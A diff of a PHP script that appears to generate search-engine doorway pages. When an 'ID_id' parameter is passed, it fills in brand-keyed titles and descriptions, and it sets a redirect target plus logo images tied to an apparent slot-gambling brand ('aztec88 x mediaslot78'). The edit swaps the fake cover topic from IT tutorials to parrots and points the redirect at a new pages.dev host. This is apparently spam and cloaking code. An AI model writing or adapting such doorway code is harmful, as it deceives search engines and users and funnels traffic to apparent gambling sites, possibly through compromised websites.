@@ -62,14 +62,14 @@ if (isset($_GET['ID_id'])) {
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND x $BRAND2 - Referensi Teknologi untuk Linux, VMware, Jaringan, dan Infrastruktur IT";
+    $title = "$BRAND x $BRAND2 - Panduan Lengkap Mengenal Dunia Burung Paruh Bengkok";
 
-    $description = "$BRAND x $BRAND2 membahas Linux, Debian, VMware, jaringan, keamanan server, monitoring, DevOps, virtualisasi, dan berbagai teknologi infrastruktur IT melalui panduan teknis praktis.";
+    $description = "$BRAND x $BRAND2 merupakan sumber informasi yang berfokus pada dunia burung paruh bengkok dan menyediakan pembahasan mengenai berbagai spesies serta kelompok parrot serta berbagai informasi mengenai karakteristik, habitat, dan pengenalan spesies";
     
     $artikel = "$BRAND x $BRAND2 dapat diposisikan secara SEO sebagai referensi untuk berbagai pencarian seperti Cyberfront Tech Blog, tutorial Debian, Linux server, VMware tutorial, VMware Cloud Foundation, home lab, network security, Prometheus, Grafana, Pi-hole, AdGuard Home, server monitoring, DevOps, dan IT infrastructure.";
 
     // Bisa diganti random image atau CDN sendiri
-    $image = "http://i.pinimg.com/1200x/be/80/24/be8024e9a599876754801b9a82199d27.jpg";
+    $image = "https://i.pinimg.com/1200x/49/ba/0f/49ba0f16063bd9471dd24b51b1fb4811.jpg";
 
     // Canonical URL
     $canonical = $current_url;
@@ -79,7 +79,7 @@ if (isset($_GET['ID_id'])) {
 }
 
 // Redirect target
-$ampmek = "https://blog-cyberfront.pages.dev/?ID_id=$BRAND";
+$ampmek = "https://parrots-cyberfront.pages.dev/?ID_id=$BRAND";
 $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 $favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
